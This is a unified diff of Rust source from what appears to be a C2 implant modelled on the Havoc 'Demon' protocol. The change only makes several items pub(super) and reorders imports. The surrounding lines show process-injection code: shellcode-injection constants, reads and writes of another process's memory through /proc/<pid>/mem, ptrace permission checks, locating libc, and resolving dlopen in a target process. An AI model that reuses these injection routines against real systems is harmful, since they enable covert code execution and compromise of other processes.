@@ -10,9 +10,9 @@ use tokio::process::Command;
 use crate::error::PhantomError;
 use crate::parser::TaskParser;
 
+use super::PhantomState;
 use super::encode::*;
 use super::types::PendingCallback;
-use super::PhantomState;
 
 // ---------------------------------------------------------------------------
 // Process injection constants (match Demon protocol)
@@ -21,14 +21,14 @@ use super::PhantomState;
 /// Injection way: spawn a new sacrificial process and inject into it.
 const INJECT_WAY_SPAWN: i32 = 0;
 /// Injection way: inject into an existing process by PID.
-const INJECT_WAY_INJECT: i32 = 1;
+pub(super) const INJECT_WAY_INJECT: i32 = 1;
 /// Injection way: execute in the current process.
-const INJECT_WAY_EXECUTE: i32 = 2;
+pub(super) const INJECT_WAY_EXECUTE: i32 = 2;
 
 /// Injection result: success.
 const INJECT_ERROR_SUCCESS: u32 = 0;
 /// Injection result: generic failure.
-const INJECT_ERROR_FAILED: u32 = 1;
+pub(super) const INJECT_ERROR_FAILED: u32 = 1;
 
 // ---------------------------------------------------------------------------
 // CommandInjectShellcode (ID 24)
@@ -545,7 +545,7 @@ fn write_to_proc_mem(pid: u32, addr: u64, data: &[u8]) -> std::io::Result<()> {
 }
 
 /// Read data from a target process's memory via `/proc/<pid>/mem`.
-fn read_from_proc_mem(pid: u32, addr: u64, len: usize) -> std::io::Result<Vec<u8>> {
+pub(super) fn read_from_proc_mem(pid: u32, addr: u64, len: usize) -> std::io::Result<Vec<u8>> {
     use std::io::{Seek, SeekFrom};
 
     let mem_path = format!("/proc/{pid}/mem");
@@ -568,7 +568,7 @@ fn read_from_proc_mem(pid: u32, addr: u64, len: usize) -> std::io::Result<Vec<u8
 ///
 /// We check our effective UID and capabilities to decide. If Yama is not
 /// present (file missing), we assume classic mode (allowed).
-fn check_ptrace_permission(target_pid: u32) -> bool {
+pub(super) fn check_ptrace_permission(target_pid: u32) -> bool {
     // Check Yama ptrace_scope.
     let scope = match fs::read_to_string("/proc/sys/kernel/yama/ptrace_scope") {
         Ok(s) => s.trim().parse::<u32>().unwrap_or(0),
@@ -786,7 +786,7 @@ fn ptrace_munmap_page(pid: u32, regs: &libc::user_regs_struct, page_addr: u64) {
 }
 
 /// Find the base address of libc in a target process by parsing `/proc/<pid>/maps`.
-fn find_libc_base(pid: u32) -> Option<u64> {
+pub(super) fn find_libc_base(pid: u32) -> Option<u64> {
     let maps = fs::read_to_string(format!("/proc/{pid}/maps")).ok()?;
     for line in maps.lines() {
         if (line.contains("libc.so") || line.contains("libc-")) && line.contains("r-xp") {
@@ -802,7 +802,7 @@ fn find_libc_base(pid: u32) -> Option<u64> {
 /// We find the offset in our own libc and combine it with the target's libc
 /// base address. This works because both processes load the same libc version
 /// (same system).
-fn resolve_dlopen_in_target(target_libc_base: u64) -> Option<u64> {
+pub(super) fn resolve_dlopen_in_target(target_libc_base: u64) -> Option<u64> {
     // Find our own libc base.
     let our_libc_base = find_libc_base(std::process::id())?;
 
